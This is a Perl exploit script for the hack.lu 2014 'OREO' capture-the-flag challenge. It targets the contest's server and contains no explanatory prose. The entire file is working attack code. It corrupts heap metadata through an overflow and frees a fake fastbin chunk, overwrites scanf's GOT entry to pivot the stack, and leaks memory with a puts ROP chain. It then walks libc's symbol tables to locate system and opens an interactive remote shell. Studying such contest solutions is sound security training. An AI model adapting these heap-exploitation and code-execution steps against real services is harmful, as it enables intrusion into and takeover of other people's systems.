#!/usr/bin/env perl

# hacklu 2014 OREO exploit
# by @_cutz

use IO::Socket;
use strict;

$|++;

my $sock = new IO::Socket::INET(
        PeerAddr => 'wildwildweb.fluxfingers.net',
        PeerPort => 1414,
        Proto => 'tcp'
) or die 'wut', $/;

sub read_until
{
        my $until = shift;
        my $ret = '';

        while (1) {
                sysread $sock, my $tmp, 1024, 0;
                $ret .= $tmp;
                return $ret if $ret =~ /$until/;
        }
}

sub create_rifle
{
        my ($name, $descr) = @_;

        print $sock '1', $/;
        read_until('name:');
        print $sock $name . $/;
        read_until('description:');
        print $sock $descr . $/;
}

sub leave_msg
{
        my $msg = shift;

        print $sock '4', $/;
        read_until('order:');
        print $sock $msg . $/;
}

sub submit_order
{
        print $sock '3', $/;
}

sub upack
{
        my $str = substr shift, 0, 4;
        return unpack 'I', $str . "\x00"x(4 - length $str);
}

sub leak
{
        my $from = shift;

        return 'addr invalid'
                if $from > 0xffffffff;

        return 'addr contains newline'
                if pack('I', $from) =~ /\n/;

        print $sock 'A'x12 .
        pack('I', 0x080484b0) .         # puts
        pack('I', 0x08048ae3) .         # pop ret
        pack('I', $from) .              # leak
        pack('I', 0x08048896) . $/;     # get_action

        $_ = read_until('Action: '), s/\nAction: //g;

        return $_;
}

sub get_elf
{
        my $start = shift;
        my $pages = 0;

        $start &= 0xfffff000;
        $pages += 0x1000 while leak($start - $pages) !~ /^\x7fELF/;

        return $start - $pages;
}

sub get_prog_headers
{
        my $base = shift;
        return upack leak($base + 28);
}

sub get_dynamic
{
        my $prog = shift;
        my $i = 0;

        while (1) {
                last if (upack leak($prog + $i)) == 2;
                $i += 32;
        }

        return upack leak($prog + $i + 8);
}

sub get_str_symtab
{
        my $dynamic = shift;
        my ($strtab, $symtab, $type);

        my $i = 0;
        while (!defined $strtab or !defined $symtab) {
                $type = upack leak($dynamic + $i);

                $strtab = upack leak($dynamic + $i + 4)
			if $type == 5;
                $symtab = upack leak($dynamic + $i + 4)
			if $type == 6;

                $i += 8;
        }

        return ($strtab, $symtab);
}

sub get_symbol
{
        my ($symbol, $strtab, $symtab) = @_;
        my $offset;
        my $i = 0;

        while (1) {
                $offset = upack leak($symtab + $i);

                return upack leak($symtab + $i + 4)
                        if leak($strtab + $offset) eq $symbol;

                $i += 16;
        }
}

sub shell
{
        while (1) {
                print '$ ';
                my $cmd = <>;
		chomp $cmd;
                print $sock $cmd, $/;
                sysread $sock, my $buf, 1024, 0;
                print $buf;
        }
}

print 'hacklu2014 OREO Exploit', $/;
print 'by cutz', $/, $/;

print '[x] filling global msg with legit chunk size', $/;
read_until('Action:');
leave_msg("\x00"x36 . pack('I', 1337));

print '[x] creating rifles for reasonable status.new fastbin size', $/;
for (1 .. 63) {
        read_until("Action:");
        create_rifle("A", "B");
}

print '[x] overflowing with last->name into last->prev', $/;
read_until("Action:");
create_rifle('B'x27 . pack('I', 0x804a2a8), 'swag');

print '[x] freeing last and last->prev', $/;
read_until('Action:');
submit_order();

print '[x] overwriting status.order_msg', $/;
read_until('Action:');
create_rifle("sh\x00\x00", pack('I', 0x804a258));       # scanf@got.plt

print '[x] overwriting scanf@got.plt and pivoting esp', $/;
read_until('Action:');
leave_msg(pack('I', 0x8048b42));        # add $0x1c,%esp; pop4; ret

print '[x] trying to leak ELF header: ';
read_until('Action:');
die 'fail', $/ if leak(0x08048000) !~ /^\x7fELF/;
print 'success', $/;

print '[x] leaking free@got using puts', $/;
my $free_got = upack leak(0x0804a238);
printf "[x] free at 0x%x\n", $free_got;

print '[x] scanning for libc base ...', $/;
my $libc_base = get_elf($free_got);
printf "[x] libc base at 0x%x\n", $libc_base;

my $prog_hdrs = get_prog_headers($libc_base) + $libc_base;
printf "[x] libc program headers at 0x%x\n", $prog_hdrs;

my $dynamic = get_dynamic($prog_hdrs) + $libc_base;
printf "[x] libc dynamic found at 0x%x\n", $dynamic;

my ($strtab, $symtab) = get_str_symtab($dynamic);
printf "[x] libc strtab found at 0x%x\n", $strtab;
printf "[x] libc symtab found at 0x%x\n", $symtab;

print '[x] dumping symbols to find system (might take a while)', $/;
my $system = get_symbol('system', $strtab, $symtab) + $libc_base;
printf "[x] system at 0x%x\n", $system;

print $sock 'A'x12 .
pack('I', $system) .            # system
pack('I', 0xdeadbeef) .         # controlled crash
pack('I', 0x0804a2c1) . $/;     # sh\0;

print '[x] starting shell', $/;
shell();
close $sock;
